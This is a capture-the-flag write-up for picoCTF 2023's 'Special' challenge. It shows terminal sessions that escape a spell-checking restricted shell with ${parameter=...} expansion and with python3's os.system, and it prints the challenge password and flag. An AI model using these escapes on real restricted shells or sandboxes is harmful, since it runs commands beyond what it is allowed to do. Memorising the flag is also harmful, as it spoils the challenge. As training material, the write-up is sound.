### Special

#Medium #General-Skills #picoCTF2023 #bashssh

Author: LT 'syreal' Jones

#### Description

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.`ssh -p 58964 ctf-player@saturn.picoctf.net`The password is `d137d16e`

##### Solution:

```css
Special$ ls
Is 
sh: 1: Is: not found
```

```css
Special$ ${parameter?ls}
${parameter?ls} 
sh: 1: parameter: ls
Special$ ${:ls}
${:ls} 
sh: 1: Bad substitution
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=ls -la}        
${parameter=ls play 
sh: 1: Syntax error: Missing '}'
Special$ ${parameter=cd blargh}
${parameter=cd blargh} 
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cat blargh}
${parameter=cat blargh} 
cat: blargh: Is a directory
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter=cat flag.txt}
${parameter=cat flag.txt} 
cat: flag.txt: No such file or directory
```

```css
Special$ ${parameter=pwd}      
${parameter=pwd} 
/home/ctf-player
Special$ ${parameter=ls}
${parameter=ls} 
blargh
Special$ ${parameter=cd blargh}
${parameter=cd blargh} 
Special$ ${parameter=pwd}
${parameter=pwd} 
/home/ctf-player
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter=cat blargh/flag.txt}
${parameter=cat blargh/flag.txt} 
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}Special$ 

```

| Command                           | Output                      |
| --------------------------------- | --------------------------- |
| ${parameter?ls}                   | parameter: ls               |
| ${:ls}                            | Bad substitution            |
| ${parameter=ls}                   | blargh                      |
| ${parameter=cat blargh}           | cat: blargh: Is a directory |
| ${parameter=cd blargh}            | ${parameter=cd blargh}      |
| ${parameter=ls blargh}            | flag.txt                    |
| ${parameter=cat  blargh/flag.txt} | This gave the flag          |
|                                   |                             |

using python we can get flag also

```python
Special$ placeholder=abc /usr/bin/python3
Placeholder=abc /usr/bin/python3 
Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("ls")
blargh
0
>>> os.system("ls blargh")
flag.txt
0
>>> os.system("cat blargh/flag.txt")
picoCTF{5p311ch3ck_15_7h3_w0r57_3befb794}0
>>> 
```